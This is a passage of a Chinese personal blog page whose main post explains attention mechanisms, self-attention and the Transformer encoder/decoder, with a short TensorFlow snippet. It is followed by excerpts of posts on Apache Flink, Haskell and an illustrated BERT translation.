<p>当用神经网络来处理大量的输入信息时，也可以借鉴人脑的注意力机制，只 选择一些关键的信息输入进行处理，来提高神经网络的效率。按照认知神经学中的注意力，可以总体上分为两类：</p>
<ul>
<li><strong>聚焦式（focus）注意力</strong>：自上而下的有意识的注意力，主动注意——是指有预定目的、依赖任务的、主动有意识地聚焦于某一对象的注意力；</li>
<li><strong>显著性（saliency-based）注意力</strong>：自下而上的有意识的注意力，被动注意——基于显著性的注意力是由外界刺激驱动的注意，不需要主动干预，也和任务无关；可以将<strong>max-pooling和门控（gating）机制</strong>来近似地看作是自下而上的基于显著性的注意力机制。</li>
</ul>
<p>在人工神经网络中，注意力机制一般就特指聚焦式注意力。</p>
<p><strong>3、Attention机制的计算流程是怎样的？</strong></p>
<figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-54fe529ded98721f35277a5bfa79febc_b.jpg" alt=""></noscript><img src="https://pic1.zhimg.com/80/v2-54fe529ded98721f35277a5bfa79febc_hd.jpg" alt=""><figcaption>Attention机制的实质：寻址（addressing）</figcaption></figure>

<p><strong>Attention机制的实质其实就是一个寻址（addressing）的过程</strong>，如上图所示：给定一个和任务相关的查询<strong>Query</strong>向量<strong> q</strong>，通过计算与<strong>Key</strong>的注意力分布并附加在<strong>Value</strong>上，从而计算<strong>Attention Value</strong>，这个过程实际上是<strong>Attention机制缓解神经网络模型复杂度的体现</strong>：不需要将所有的N个输入信息都输入到神经网络进行计算，只需要从X中选择一些和任务相关的信息输入给神经网络。</p>
<blockquote>
<p><strong><em>注意力机制可以分为三步：一是信息输入；二是计算注意力分布α；三是根据注意力分布α 来计算输入信息的加权平均。</em></strong></p>
</blockquote>
<p><strong>step1-信息输入</strong>：用<strong>X</strong> = [x1, · · · , xN ]表示N 个输入信息；</p>
<p><strong>step2-注意力分布计算</strong>：令<strong>Key</strong>=<strong>Value</strong>=<strong>X</strong>，则可以给出注意力分布</p>
<p><img src="https://www.zhihu.com/equation?tex=%5Calpha_i%3Dsoftmax%28s%28key_i%2Cq%29%29%3Dsoftmax%28s%28X_i%2Cq%29%29" alt="[公式]"> </p>
<p>我们将 <img src="https://www.zhihu.com/equation?tex=%5Calpha_i" alt="[公式]"> 称之为注意力分布（概率分布）， <img src="https://www.zhihu.com/equation?tex=s%28X_i%2Cq%29" alt="[公式]"> 为注意力打分机制，有几种打分机制：</p>
<figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-981a0c9ab01531c7139e4701574cb056_b.jpg" alt=""></noscript><img src="https://pic3.zhimg.com/80/v2-981a0c9ab01531c7139e4701574cb056_hd.jpg" alt=""></figure>

<p><strong>step3-信息加权平均</strong>：注意力分布 <img src="https://www.zhihu.com/equation?tex=%5Calpha_i" alt="[公式]"> 可以解释为在上下文查询<strong>q</strong>时，第i个信息受关注的程度，采用一种“软性”的信息选择机制对输入信息<strong>X</strong>进行编码为：</p>
<p><img src="https://www.zhihu.com/equation?tex=att%28q%2CX%29%3D%5Csum_%7Bi%3D1%7D%5E%7BN%7D%7B%5Calpha_iX_i%7D" alt="[公式]"> </p>
<p>这种编码方式为<strong>软性注意力机制（soft Attention）</strong>，软性注意力机制有两种：普通模式（<strong>Key</strong>=<strong>Value</strong>=<strong>X</strong>）和键值对模式（<strong>Key！</strong>=<strong>Value</strong>）。</p>
<figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-aa371755dc73b7137149b8d2905fc4ba_b.jpg" alt=""></noscript><img src="https://pic3.zhimg.com/80/v2-aa371755dc73b7137149b8d2905fc4ba_hd.jpg" alt=""><figcaption>软性注意力机制（soft Attention）</figcaption></figure>

<p><strong>4、Attention机制的变种有哪些？</strong></p>
<p>与普通的Attention机制（上图左）相比，Attention机制有哪些变种呢？</p>
<ul>
<li><p><strong>变种1-硬性注意力：</strong>之前提到的注意力是软性注意力，其选择的信息是所有输入信息在注意力 分布下的期望。还有一种注意力是只关注到某一个位置上的信息，叫做硬性注意力（hard attention）。硬性注意力有两种实现方式：（1）一种是选取最高概率的输入信息；（2）另一种硬性注意力可以通过在注意力分布式上随机采样的方式实现。硬性注意力模型的缺点：&gt; 硬性注意力的一个缺点是基于最大采样或随机采样的方式来选择信息。因此最终的损失函数与注意力分布之间的函数关系不可导，因此无法使用在反向传播算法进行训练。为了使用反向传播算法，一般使用软性注意力来代替硬性注意力。硬性注意力需要通过强化学习来进行训练。——<a href="https://link.zhihu.com/?target=https%3A//nndl.github.io/" target="_blank" rel="noopener">《神经网络与深度学习》</a></p>
</li>
<li><p><strong>变种2-键值对注意力：</strong>即上图右边的键值对模式，此时Key！=Value，注意力函数变为：<figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-49a8acda3757ea21218b2f7ecca6e9ae_b.jpg" alt=""></noscript><img src="https://pic3.zhimg.com/80/v2-49a8acda3757ea21218b2f7ecca6e9ae_hd.jpg" alt=""></figure></p>
</li>
<li><p><strong>变种3-多头注意力：</strong>多头注意力（multi-head attention）是利用多个查询Q = [q1, · · · , qM]，来平行地计算从输入信息中选取多个信息。每个注意力关注输入信息的不同部分，然后再进行拼接：<figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-27673fff36241d6ef163c9ac1cedcce7_b.png" alt=""></noscript><img src="https://pic4.zhimg.com/80/v2-27673fff36241d6ef163c9ac1cedcce7_hd.png" alt=""></figure></p>
</li>
</ul>
<p><strong>5、一种强大的Attention机制：为什么自注意力模型（self-Attention model）在长距离序列中如此强大？</strong></p>
<p><strong>（1）卷积或循环神经网络难道不能处理长距离序列吗？</strong></p>
<p>当使用神经网络来处理一个变长的向量序列时，我们通常可以使用卷积网络或循环网络进行编码来得到一个相同长度的输出向量序列，如图所示：</p>
<figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-8b369281a66bea6920962f45660a9f0a_b.jpg" alt=""></noscript><img src="https://pic3.zhimg.com/80/v2-8b369281a66bea6920962f45660a9f0a_hd.jpg" alt=""><figcaption> 基于卷积网络和循环网络的变长序列编码</figcaption></figure>

<p>从上图可以看出，无论卷积还是循环神经网络其实都是对变长序列的一种“<strong>局部编码</strong>”：卷积神经网络显然是基于N-gram的局部编码；而对于循环神经网络，由于梯度消失等问题也只能建立短距离依赖。</p>
<p><strong>（2）要解决这种短距离依赖的“局部编码”问题，从而对输入序列建立长距离依赖关系，有哪些办法呢？</strong></p>
<blockquote>
<p>如果要建立输入序列之间的长距离依赖关系，可以使用以下两种方法：一 种方法是增加网络的层数，通过一个深层网络来获取远距离的信息交互，另一种方法是使用全连接网络。 ——<a href="https://link.zhihu.com/?target=https%3A//nndl.github.io/" target="_blank" rel="noopener">《神经网络与深度学习》</a><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-cd2d7f0961c669d983b73db4e93ccbdc_b.jpg" alt=""></noscript><img src="https://pic1.zhimg.com/80/v2-cd2d7f0961c669d983b73db4e93ccbdc_hd.jpg" alt=""><figcaption>全连接模型和自注意力模型：实线表示为可学习的权重，虚线表示动态生成的权重。</figcaption></figure></p>
</blockquote>
<p>由上图可以看出，全连接网络虽然是一种非常直接的建模远距离依赖的模型， 但是无法处理变长的输入序列。不同的输入长度，其连接权重的大小也是不同的。</p>
<p>这时我们就可以利用注意力机制来“动态”地生成不同连接的权重，这就是自注意力模型（self-attention model）。由于自注意力模型的权重是动态生成的，因此可以处理变长的信息序列。 </p>
<p>总体来说，<strong>为什么自注意力模型（self-Attention model）如此强大</strong>：<strong>利用注意力机制来“动态”地生成不同连接的权重，从而处理变长的信息序列。</strong></p>
<p><strong>（3）自注意力模型（self-Attention model）具体的计算流程是怎样的呢?</strong></p>
<p>同样，给出信息输入：用X = [x1, · · · , xN ]表示N 个输入信息；通过线性变换得到为查询向量序列，键向量序列和值向量序列：</p>
<figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-ab400406cf423842e4274527dc5a7074_b.png" alt=""></noscript><img src="https://pic1.zhimg.com/80/v2-ab400406cf423842e4274527dc5a7074_hd.png" alt=""></figure>

<p>上面的公式可以看出，<strong>self-Attention中的Q是对自身（self）输入的变换，而在传统的Attention中，Q来自于外部。</strong></p>
<figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-fcc2df696966a9c6700d1476690cff9f_b.jpg" alt=""></noscript><img src="https://pic4.zhimg.com/80/v2-fcc2df696966a9c6700d1476690cff9f_hd.jpg" alt=""><figcaption>self-Attention计算过程剖解（来自《细讲 | Attention Is All You Need 》）</figcaption></figure>

<p>注意力计算公式为：</p>
<figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-72093f153e59cfdc851e2ac1fbf5c03d_b.jpg" alt=""></noscript><img src="https://pic2.zhimg.com/80/v2-72093f153e59cfdc851e2ac1fbf5c03d_hd.jpg" alt=""></figure>

<p>自注意力模型（self-Attention model）中，通常使用缩放点积来作为注意力打分函数，输出向量序列可以写为：</p>
<figure data-size="normal"><noscript><img src="https://pic2.zhimg.com/v2-2f76af60c24ba75e37f2f5df8edfdb71_b.jpg" alt=""></noscript><img src="https://pic2.zhimg.com/80/v2-2f76af60c24ba75e37f2f5df8edfdb71_hd.jpg" alt=""></figure>

<h2 id="二、Transformer（Attention-Is-All-You-Need）详解"><a href="#二、Transformer（Attention-Is-All-You-Need）详解" class="headerlink" title="二、Transformer（Attention Is All You Need）详解"></a><strong>二、Transformer（Attention Is All You Need）详解</strong></h2><p>从Transformer这篇论文的题目可以看出，Transformer的核心就是Attention，这也就是为什么本文会在剖析玩Attention机制之后会引出Transformer，如果对上面的Attention机制特别是自注意力模型（self-Attention model）理解后，Transformer就很容易理解了。</p>
<p><strong>1、Transformer的整体架构是怎样的？由哪些部分组成？</strong></p>
<figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-7f8b460cd617fedc822064c4230302b0_b.jpg" alt=""></noscript><img src="https://pic1.zhimg.com/80/v2-7f8b460cd617fedc822064c4230302b0_hd.jpg" alt=""><figcaption>Transformer模型架构</figcaption></figure>

<p>Transformer其实这就是一个Seq2Seq模型，左边一个encoder把输入读进去，右边一个decoder得到输出：</p>
<figure data-size="small"><noscript><img src="https://pic4.zhimg.com/v2-846cf91009c44c6e479bada42bfc437f_b.jpg" alt=""></noscript><img src="https://pic4.zhimg.com/80/v2-846cf91009c44c6e479bada42bfc437f_hd.jpg" alt=""><figcaption>Seq2Seq模型</figcaption></figure>

<p><strong>Transformer=Transformer Encoder+Transformer Decoder</strong></p>
<p><strong>（1）Transformer Encoder（N=6层，每层包括2个sub-layers）：</strong></p>
<figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-3b97d37951078856097069778293230a_b.jpg" alt=""></noscript><img src="https://pic3.zhimg.com/80/v2-3b97d37951078856097069778293230a_hd.jpg" alt=""><figcaption>Transformer Encoder</figcaption></figure>

<ul>
<li><strong>sub-layer-1</strong>：<strong>multi-head self-attention mechanism</strong>，用来进行self-attention。</li>
<li><strong>sub-layer-2</strong>：<strong>Position-wise Feed-forward Networks</strong>，简单的全连接网络，对每个position的向量分别进行相同的操作，包括两个线性变换和一个ReLU激活输出（输入输出层的维度都为512，中间层为2048）：<figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-5236351e3efd93d567ac1fceea7716ee_b.png" alt=""></noscript><img src="https://pic3.zhimg.com/80/v2-5236351e3efd93d567ac1fceea7716ee_hd.png" alt=""></figure></li>
</ul>
<p>每个sub-layer都使用了残差网络： <img src="https://www.zhihu.com/equation?tex=LayerNorm%28X%2Bsublayer%28X%29%29" alt="[公式]"> </p>
<p><strong>（2）Transformer Decoder（N=6层，每层包括3个sub-layers）：</strong></p>
<figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-4dc71fe78c4752645de1f1ba8dd762a4_b.jpg" alt=""></noscript><img src="https://pic1.zhimg.com/80/v2-4dc71fe78c4752645de1f1ba8dd762a4_hd.jpg" alt=""><figcaption>Transformer Decoder</figcaption></figure>

<ul>
<li><strong>sub-layer-1</strong>：<strong>Masked multi-head self-attention mechanism</strong>，用来进行self-attention，与Encoder不同：由于是序列生成过程，所以在时刻 i 的时候，大于 i 的时刻都没有结果，只有小于 i 的时刻有结果，因此需要做<strong>Mask</strong>。</li>
<li><strong>sub-layer-2</strong>：<strong>Position-wise Feed-forward Networks</strong>，同Encoder。</li>
<li><strong>sub-layer-3</strong>：<strong>Encoder-Decoder attention计算</strong>。</li>
</ul>
<p><strong>2、Transformer Encoder 与 Transformer Decoder 有哪些不同？</strong></p>
<p>（1）multi-head self-attention mechanism不同，Encoder中不需要使用Masked，而Decoder中需要使用Masked；</p>
<p>（2）Decoder中多了一层Encoder-Decoder attention，这与 self-attention mechanism不同。</p>
<p><strong>3、Encoder-Decoder attention 与self-attention mechanism有哪些不同？</strong></p>
<p>它们都是用了 multi-head计算，不过Encoder-Decoder attention采用传统的attention机制，其中的Query是self-attention mechanism已经计算出的上一时间i处的编码值，Key和Value都是Encoder的输出，这与self-attention mechanism不同。代码中具体体现：</p>
<div class="highlight"><br><br>     ## Multihead Attention ( self-attention)<br>                self.dec = multihead_attention(queries=self.dec,<br>                                               keys=self.dec,<br>                                               num_units=hp.hidden_units,<br>                                               num_heads=hp.num_heads,<br>                                               dropout_rate=hp.dropout_rate,<br>                                               is_training=is_training,<br>                                               causality=True,<br>                                               scope=”self_attention”)<br><br>    ## Multihead Attention ( Encoder-Decoder attention)<br>                self.dec = multihead_attention(queries=self.dec,<br>                                               keys=self.enc,<br>                                               num_units=hp.hidden_units,<br>                                               num_heads=hp.num_heads,<br>                                               dropout_rate=hp.dropout_rate,<br>                                               is_training=is_training,<br>                                               causality=False,<br>                                               scope=”vanilla_attention”)<br></div>

<p><strong>4、multi-head self-attention mechanism具体的计算过程是怎样的？</strong> </p>
<figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-392692c19c57f5bfa116f7b505dfde7a_b.jpg" alt=""></noscript><img src="https://pic3.zhimg.com/80/v2-392692c19c57f5bfa116f7b505dfde7a_hd.jpg" alt=""><figcaption>multi-head self-attention mechanism计算过程</figcaption></figure>

<p>Transformer中的Attention机制由<strong>Scaled Dot-Product Attention</strong>和<strong>Multi-Head Attention</strong>组成，上图给出了整体流程。下面具体介绍各个环节：</p>
<ul>
<li><strong>Expand</strong>：实际上是经过线性变换，生成Q、K、V三个向量；</li>
<li><strong>Split heads</strong>: 进行分头操作，在原文中将原来每个位置512维度分成8个head，每个head维度变为64；</li>
<li><strong>Self Attention</strong>：对每个head进行Self Attention，具体过程和第一部分介绍的一致；</li>
<li><strong>Concat heads</strong>：对进行完Self Attention每个head进行拼接；</li>
</ul>
<p>上述过程公式为：</p>
<figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-c7100e268bcefaa7ff0a1344acc15e7e_b.jpg" alt=""></noscript><img src="https://pic3.zhimg.com/80/v2-c7100e268bcefaa7ff0a1344acc15e7e_hd.jpg" alt=""></figure>

<p><strong>5、Transformer在GPT和Bert等词向量预训练模型中具体是怎么应用的？有什么变化？</strong></p>
<ul>
<li>GPT中训练的是单向语言模型，其实就是直接应用<strong>Transformer Decoder</strong>；</li>
<li>Bert中训练的是双向语言模型，应用了<strong>Transformer Encoder</strong>部分，不过在Encoder基础上还做了<strong>Masked操作</strong>；</li>
</ul>
<p>BERT Transformer 使用双向self-attention，而GPT Transformer 使用受限制的self-attention，其中每个token只能处理其左侧的上下文。双向 Transformer 通常被称为“Transformer encoder”，而左侧上下文被称为“Transformer decoder”，decoder是不能获要预测的信息的。</p>
<p><strong>Reference</strong></p>
<ol>
<li><a href="https://link.zhihu.com/?target=https%3A//nndl.github.io/" target="_blank" rel="noopener">《神经网络与深度学习》</a>2.  <a href="https://link.zhihu.com/?target=https%3A//arxiv.org/abs/1706.03762" target="_blank" rel="noopener">Attention Is All You Need</a>3.  <a href="https://link.zhihu.com/?target=http%3A//www.chinahadoop.cn/course/1253" target="_blank" rel="noopener">谷歌BERT解析—-2小时上手最强NLP训练模型</a>4.  <a href="https://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/RLxWevVWHXgX-UcoxDS70w" target="_blank" rel="noopener">细讲 | Attention Is All You Need</a>5.  <a href="https://zhuanlan.zhihu.com/p/37601161" target="_blank" rel="noopener">深度学习中的注意力模型（2017版）</a></li>
</ol>
<p>tt</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/13/啥是Apache Flink！/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/13/啥是Apache Flink！/" itemprop="url">啥是Apache Flink！</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-13T22:16:08+08:00">
                2019-04-13
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/04/13/啥是Apache Flink！/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/04/13/啥是Apache Flink！/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.8k字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>Apache Flink（以下简称Flink）项目是大数据处理领域最近冉冉升起的一颗新星，其不同于其他大数据项目的诸多特性吸引了越来越多人的关注。本文将深入分析Flink的一些关键技术与特性，希望能够帮助读者对Flink有更加深入的了解，对其他大数据系统开发者也能有所裨益。本文假设读者已对MapReduce、Spark及Storm等大数据处理框架有所了解，同时熟悉流处理与批处理的基本概念。</p>
<h1 id="Flink简介"><a href="#Flink简介" class="headerlink" title="Flink简介"></a>Flink简介</h1><p>Flink核心是一个流式的数据流执行引擎，其针对数据流的分布式计算提供了数据分布、数据通信以及容错机制等功能。基于流执行引擎，Flink提供了诸多更高抽象层的API以便用户编写分布式任务：<br></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2019/04/13/啥是Apache Flink！/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/13/为什么业界很少使用 Haskell？/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/13/为什么业界很少使用 Haskell？/" itemprop="url">为什么业界很少使用 Haskell？</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-13T22:15:08+08:00">
                2019-04-13
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/04/13/为什么业界很少使用 Haskell？/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/04/13/为什么业界很少使用 Haskell？/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.2k字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>这是 Stackoverflow 中一篇答案的粗略翻译，原文地址 <a href="https://stackoverflow.com/a/2302230/296473" target="_blank" rel="noopener">http://stackoverflow.com/a/2302230/296473</a>已失效。</p>
<ol>
<li><p><strong>没有人听说过它。</strong>没有人会使用他们根本不知道的东西。</p>
</li>
<li><p><strong>不够流行。</strong>人们认为最流行的语言就是最好的语言，因为如果它不好的话，它就不会流行。实际上这根本不成立。最流行的语言最流行，仅此而已。Haskell 不流行是因为它不流行。这就是 Haskell 里经常用到的「递归」。不管来自命令式编程世界的人们怎么说，递归在现实世界中非常常见。</p>
</li>
<li><p><strong>它不一样。</strong>人们总是害怕新事物。</p></li></ol>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2019/04/13/为什么业界很少使用 Haskell？/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/图解BERT/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yimitri">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/headpic.png">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="国家二级薯条试吃员">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/26/图解BERT/" itemprop="url">图解BERT</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-26T22:15:08+08:00">
                2019-03-26
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/03/26/图解BERT/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/03/26/图解BERT/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  4.4k字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  15分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h2 id="图解BERT（NLP中的迁移学习）"><a href="#图解BERT（NLP中的迁移学习）" class="headerlink" title="图解BERT（NLP中的迁移学习）"></a><a href="">图解BERT（NLP中的迁移学习）</a></h2><p>目录</p>
<ul>
<li><a href="#一例子句子分类">一、例子:句子分类</a></li>
<li><a href="#二模型架构">二、模型架构</a><ul>
<li><a href="#模型的输入">模型的输入</a></li>
<li><a href="#模型的输出">模型的输出</a></li>
</ul>
</li>
<li><a href="#三与卷积网络并行">三、与卷积网络并行</a></li>
<li><a href="#四嵌入表示的新时代">四、嵌入表示的新时代</a><ul>
<li><a href="#回顾一下词嵌入">回顾一下词嵌入</a></li>
<li><a href="#elmo-语境的重要性">ELMo: 语境的重要性</a></li>
</ul>
</li>
<li><a href="#五ulm-fit搞懂nlp中的迁移学习">五、ULM-FiT：搞懂NLP中的迁移学习</a></li>
<li><a href="#六transformer超越lstm">六、Transformer：超越LSTM</a></li>
<li><a href="#七openaitransformer为语言建模预训练一个transformer解码器">七、OpenAI　Transformer：为语言建模预训练一个Transformer解码器</a></li>
<li><a href="#八在下游任务中使用迁移学习">八、在下游任务中使用迁移学习</a></li>
<li><a href="#九bert从解码器到编码器">九、BERT：从解码器到编码器</a><ul>
<li><a href="#mlm语言模型">MLM语言模型</a></li>
<li><a href="#两个句子的任务">两个句子的任务</a></li>
<li><a href="#解决特定任务的模型">解决特定任务的模型</a></li>
<li><a href="#用于特征提取的bert">用于特征提取的BERT</a></li>
</ul>
</li>
<li><a href="#十把bert牵出来遛一遛">十、把BERT牵出来遛一遛</a></li>
</ul>
<p><em>本文翻译自Jay Alammar的博客<a href="https://jalammar.github.io/illustrated-bert/" target="_blank" rel="noopener">The Illustrated BERT, ELMo, and co. (How NLP Cracked Transfer Learning)</a></em><br></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2019/03/26/图解BERT/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/headpic.png" alt="Yimitri">
            
              <p class="site-author-name" itemprop="name">Yimitri</p>
              <p class="site-description motion-element" itemprop="description">深度学习 网络安全</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">20</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">4</span>
                  <span class="site-state-item-name">分类</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/newdimitri" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:Yimitrii@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://ws3.sinaimg.cn/large/005BYqpgly1g1jru8map2j30kw0r241d.jpg" target="_blank" title="Wechat">
                      
                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.zhihu.com/org/peddlepaddleqian-yan-gen-zong/activities" target="_blank" title="知乎">
                      
                        <i class="fa fa-fw fa-mortar-board (alias)"></i>知乎</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Yimitri</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">59.7k</span>
  
</div>


